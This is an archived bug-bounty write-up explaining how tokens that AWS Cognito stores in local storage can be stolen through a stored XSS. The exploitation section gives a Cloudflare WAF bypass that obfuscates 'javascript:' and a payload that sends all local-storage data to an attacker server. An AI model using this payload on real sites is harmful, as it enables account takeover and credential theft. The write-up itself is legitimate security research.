# Stored XSS to Account Takeover (AWS Cognito)

- **Source URL:** https://medium.com/@majix_de/stored-xss-to-account-takeover-aws-cognito-c5f76f04befe?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240607230732/https://medium.com/@majix_de/stored-xss-to-account-takeover-aws-cognito-c5f76f04befe?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/6332 (id 6332)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Hello again! Today, I want to discuss a recent finding from my penetration test. We’ll examine how AWS Cognito handles data insecurely and how this vulnerability can be exploited using a simple XSS attack. This issue can and will ultimately lead to a complete account takeover. We will also check out a cool WAF XSS bypass that in the end helped me to exploit the application.

# Overview of AWS Cognito

*For those who are already familiar with the basics, feel free to scroll down directly to the exploit.*

Before we dive in, let’s take a moment to understand what AWS Cognito does. AWS Cognito is a service offered by Amazon Web Services that assists developers in managing user authentication, authorization, and user data so you don’t have to. Cognito consists of two main services: the *User Pool* and the *Identity Pool*.

## The user pool

The User Pool is a user directory in AWS Cognito that allows you to manage and maintain user profiles. It provides sign-up and sign-in functionality for your app users, along with the ability to handle user attributes, account recovery, and multi-factor authentication. Essentially, the User Pool acts as a secure user store to facilitate user management and authentication within your application.

## The identity pool

The Identity Pool in AWS Cognito enables you to grant your users access to AWS services. It allows you to create unique identities for your users and authenticate them with either your User Pool or external identity providers, such as Google, Facebook, or Amazon. Once authenticated, the Identity Pool provides temporary AWS credentials, allowing users to access other AWS services securely.

# Attack surface

While Amazon Cognito is an effective and secure solution for managing authentication, it has a significant flaw in its token storage mechanism. Specifically, Cognito stores authentication tokens in the local storage of the browser.

Storing tokens in local storage introduces several security vulnerabilities. Local storage is accessible through JavaScript, making it susceptible to Cross-Site Scripting (XSS) attacks. If an attacker can inject malicious scripts into a web application, they can potentially access these tokens, leading to token theft. This allows attackers to impersonate users, gaining unauthorized access to sensitive information and resources.

# Exploitation

With this information in mind, I focused on finding XSS vulnerabilities during this pentest. After some digging, I noticed HTML rendering within error and notification messages that appeared during specific actions, such as deleting items. The errors reflected a title I was able to set for some items on the page. Fortunately, the title length was nearly unlimited, allowing me to exploit this further.

```
<div id="content">
  Would you like to delete <s>Hello World</s>?
</div>
```
However, the presence of a Web Application Firewall (WAF) made it extremely challenging, as it blocked nearly every exploit I tried. Even though I was able to pass in some basic HTML tags that were not blocked, the WAF detected nearly every bypass and obfuscation technique I tried. Until I found a super interesting Cloudflare bypass from 27th February 2018, which looks like this:

`<a href="j	a	v	asc
ri	pt:<JS_HERE>">Click me</a>`
And translates to the following in the DOM:

```
<div id="content">
  Would you like to delete <a href="j a v asc
  ri pt:<JS_HERE>">Hello World</a>?
</div>
```
And essentially just means this:

`<a href="javascript:<JS_HERE>">`
Finally, I was able to abuse JavaScript to fetch the local storage and send it to my server. However, the browser refused to make a CORS request via `fetch` since there were no headers present in the application, causing the browser to default to a stricter policy. Luckily, we can use a simple image, setting the `src` attribute to our server and adding a GET parameter containing the local storage data. Here is a simple JS payload that does just that (pretty formatted):

```
<a href="j	a	v	asc
ri	pt:
(function()
{
  var data='';
  for(var i=0;i<localStorage.length;i++)
    {
      var key=localStorage.key(i);
      data+=key+'='+localStorage.getItem(key)+'&';
    }
  var img=new Image();
  img.src='https://<ATTACKER_SERVER>/?'+encodeURIComponent(data);
})();">
Click me
</a>
```
Most importantly, we receive the *idToken*, which is used in the authentication flow to retrieve an *X-Amz-Security-Token*. This token is used in all authenticated requests, similar to a JWT. With this token, we can now essentially log in as the victim who clicked on our payload.

There we go, we successfully have an Account Takeover. This bug was a journy to find and exploit. Thanks for reading!

Check out my Twitter for more stuff — [Majix](https://web.archive.org/web/20240607230732/https://x.com/majix_de)
